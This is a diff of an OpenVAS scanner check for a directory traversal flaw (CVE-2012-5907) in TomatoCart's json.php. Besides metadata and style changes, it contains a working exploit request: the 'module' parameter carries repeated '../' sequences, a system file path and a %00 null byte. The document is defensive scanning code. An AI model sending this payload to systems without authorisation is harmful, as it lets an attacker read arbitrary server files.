@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_tomatocart_dir_traversal_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
+# $Id: secpod_tomatocart_dir_traversal_vuln.nasl 11188 2018-09-03 11:04:26Z cfischer $
 #
 # TomatoCart 'json.php' Directory Traversal Vulnerability
 #
@@ -27,15 +27,14 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.901302");
-  script_version("$Revision: 7577 $");
+  script_version("$Revision: 11188 $");
   script_cve_id("CVE-2012-5907");
   script_bugtraq_id(52766);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-03 13:04:26 +0200 (Mon, 03 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-11-28 10:32:05 +0530 (Wed, 28 Nov 2012)");
   script_name("TomatoCart 'json.php' Directory Traversal Vulnerability");
-
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2012 SecPod");
   script_family("Web application abuses");
@@ -43,28 +42,32 @@ if(description)
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name : "impact" , value : "Successful exploitation could allow attackers to perform
+  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/74459");
+  script_xref(name:"URL", value:"http://www.mavitunasecurity.com/local-file-inclusion-vulnerability-in-tomatocart/");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/111291/TomatoCart-1.2.0-Alpha-2-Local-File-Inclusion.html");
+
+  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform
   directory traversal attacks and read arbitrary files on the affected application
   and execute arbitrary script code.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "TomatoCart version 1.2.0 Alpha 2 and prior");
-  script_tag(name : "insight" , value : "The flaw is due to improper validation of user supplied input via the
+
+  script_tag(name:"affected", value:"TomatoCart version 1.2.0 Alpha 2 and prior");
+
+  script_tag(name:"insight", value:"The flaw is due to improper validation of user supplied input via the
   'module' parameter to json.php, which allows attackers to read arbitrary files via a
   ../(dot dot) sequences.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "This host is installed with TomatoCart and is prone to directory
-  traversal vulnerability.");
 
-  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74459");
-  script_xref(name : "URL" , value : "http://www.mavitunasecurity.com/local-file-inclusion-vulnerability-in-tomatocart/");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/111291/TomatoCart-1.2.0-Alpha-2-Local-File-Inclusion.html");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+
+  script_tag(name:"summary", value:"This host is installed with TomatoCart and is prone to directory
+  traversal vulnerability.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"remote_app");
+
   exit(0);
 }
 
@@ -73,19 +76,12 @@ include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
 
-## variable initialization
-cartUrl = "";
-cartPort = 0;
-
 cartPort = get_http_port(default:80);
 if(!can_host_php(port:cartPort))exit(0);
 
-## traversal_files() function Returns Dictionary (i.e key value pair)
-## Get Content to be checked and file to be check
 files = traversal_files();
 
-foreach dir (make_list_unique("/TomatoCart", "/tomatocart", "/", cgi_dirs(port:cartPort)))
-{
+foreach dir (make_list_unique("/TomatoCart", "/tomatocart", "/", cgi_dirs(port:cartPort))){
 
   if(dir == "/") dir = "";
   cartUrl = dir + "/index.php";
@@ -93,18 +89,14 @@ foreach dir (make_list_unique("/TomatoCart", "/tomatocart", "/", cgi_dirs(port:c
   if( isnull( res ) ) continue;
 
   if( res =~ "HTTP/1.. 200" && ">TomatoCart<" >< res && '>Login<' >< res &&
-      '>Create Account<' >< res && '>My Wishlist<' >< res ) {
+      '>Create Account<' >< res && '>My Wishlist<' >< res ){
 
-    foreach file (keys(files))
-    {
-      ## Construct directory traversal attack
-      cartUrl = dir + "/json.php?action=3&module=" +
-            crap(data:"../", length:3*15) + files[file] + "%00";
+    foreach file (keys(files)){
+      cartUrl = dir + "/json.php?action=3&module=" + crap(data:"../", length:3*15) + files[file] + "%00";
 
-      ## Confirm exploit worked properly or not
-      if(http_vuln_check(port:cartPort, url:cartUrl, check_header:TRUE, pattern:file))
-      {
-        security_message(port:cartPort);
+      if(http_vuln_check(port:cartPort, url:cartUrl, check_header:TRUE, pattern:file)){
+        report = report_vuln_url(port:cartPort, url:cartUrl);
+        security_message(port:cartPort, data:report);
         exit(0);
       }
     }
